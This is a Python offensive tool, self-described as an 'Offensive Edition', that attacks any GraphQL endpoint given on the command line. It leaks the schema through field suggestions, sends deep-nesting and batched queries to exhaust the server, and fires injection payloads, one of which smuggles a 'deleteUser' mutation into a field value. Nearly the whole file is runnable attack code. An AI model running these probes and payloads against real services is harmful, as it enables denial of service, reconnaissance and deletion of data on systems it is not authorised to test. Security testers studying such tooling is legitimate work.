#!/usr/bin/env python3
#!/usr/bin/env python3
"""
GraphQL Query Injection & Abuse Testing Module â€“ Offensive Edition
"""

import aiohttp
import asyncio
import json
import time
from typing import List, Dict, Any

class QueryInjector:
    def __init__(self, endpoint: str):
        self.endpoint = endpoint

    # ======================================================
    # ðŸ§ª Field Suggestion Testing (Schema Leakage)
    # ======================================================
    async def test_field_suggestion(self, field_names: List[str]) -> Dict[str, Any]:
        results = {}
        async with aiohttp.ClientSession() as session:
            for field_name in field_names:
                payloads = [
                    f"query {{ {field_name} {{ id }} }}",
                    f"query {{ {field_name}(id: 1) {{ id name }} }}",
                    f"query {{ {field_name}List {{ id }} }}",
                    f"query {{ get{field_name.capitalize()} {{ id }} }}"
                ]

                for q in payloads:
                    try:
                        async with session.post(self.endpoint, json={"query": q}, timeout=8) as resp:
                            data = await resp.json()
                            status = resp.status

                            entry = results.setdefault(field_name, {"queries": [], "suggestions": []})
                            entry["queries"].append({
                                "query": q,
                                "status": status,
                                "data": data.get("data"),
                                "errors": data.get("errors")
                            })

                            # âœ… parse suggestions if present
                            if "errors" in data:
                                for err in data["errors"]:
                                    if "suggestion" in json.dumps(err).lower():
                                        entry["suggestions"].append(err)
                                        entry["vulnerable"] = True
                    except Exception:
                        continue
        return results

    # ======================================================
    # ðŸ§¨ Query Depth Abuse Testing (DoS Potential)
    # ======================================================
    async def test_query_depth_attack(self, max_depth: int = 10) -> Dict[str, Any]:
        results = {}
        async with aiohttp.ClientSession() as session:
            for depth in range(1, max_depth + 1):
                query = self._generate_deep_query(depth)
                start = time.time()
                try:
                    async with session.post(self.endpoint, json={"query": query}, timeout=15) as resp:
                        duration = round(time.time() - start, 3)
                        data = await resp.json()
                        results[depth] = {
                            "status": resp.status,
                            "time": duration,
                            "vulnerable": resp.status == 200 and duration > 1.5,
                            "response_excerpt": str(data)[:300]
                        }

                        # Stop if server blocks deep nesting
                        if resp.status != 200 or "depth" in json.dumps(data).lower():
                            break
                except Exception as e:
                    results[depth] = {"error": str(e)}
                    break
        return results

    def _generate_deep_query(self, depth: int) -> str:
        query = "query { "
        for i in range(depth):
            query += f"level{i} {{ "
        query += "__typename " + "}" * depth + " }"
        return query

    # ======================================================
    # ðŸ“¦ Batch Query Abuse (Resource Exhaustion)
    # ======================================================
    async def test_batch_query_attack(self, queries: List[str]) -> Dict[str, Any]:
        payload = [
            {"query": q, "variables": {}, "operationName": f"batch_{i}"}
            for i, q in enumerate(queries)
        ]

        async with aiohttp.ClientSession() as session:
            try:
                async with session.post(self.endpoint, json=payload, timeout=15) as resp:
                    data = await resp.json()
                    return {
                        "status": resp.status,
                        "vulnerable": resp.status == 200 and len(data) > 1,
                        "response_count": len(data) if isinstance(data, list) else 1,
                        "response_excerpt": str(data)[:300]
                    }
            except Exception as e:
                return {"error": str(e)}

    # ======================================================
    # ðŸ§¬ Injection Payload Testing (Field-Level Injection)
    # ======================================================
    async def test_inline_injection(self) -> Dict[str, Any]:
        payloads = [
            'query { user(id: "1 OR 1=1") { id name } }',
            'query { user(id: "1); mutation { deleteUser(id: 1) } #") { id } }',
            'query { search(term: "\\" }) { id } }'
        ]
        results = []
        async with aiohttp.ClientSession() as session:
            for p in payloads:
                try:
                    async with session.post(self.endpoint, json={"query": p}, timeout=8) as resp:
                        data = await resp.json()
                        results.append({
                            "payload": p,
                            "status": resp.status,
                            "errors": data.get("errors"),
                            "vulnerable": resp.status == 200 and "syntax" not in json.dumps(data).lower()
                        })
                except Exception as e:
                    results.append({"payload": p, "error": str(e)})
        return {"injection_tests": results}


# ðŸ§ª CLI Usage
if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 graphql_query_injector.py <endpoint>")
        sys.exit(1)

    endpoint = sys.argv[1]
    injector = QueryInjector(endpoint)

    async def run_tests():
        fields = ["user", "product", "admin"]
        print("[*] Field Suggestion Test")
        print(json.dumps(await injector.test_field_suggestion(fields), indent=2))

        print("\n[*] Depth Attack Test")
        print(json.dumps(await injector.test_query_depth_attack(12), indent=2))

        print("\n[*] Batch Query Attack")
        print(json.dumps(await injector.test_batch_query_attack([
            "query { __typename }", "query { __typename }", "query { __typename }"
        ]), indent=2))

        print("\n[*] Inline Injection Test")
        print(json.dumps(await injector.test_inline_injection(), indent=2))

    asyncio.run(run_tests())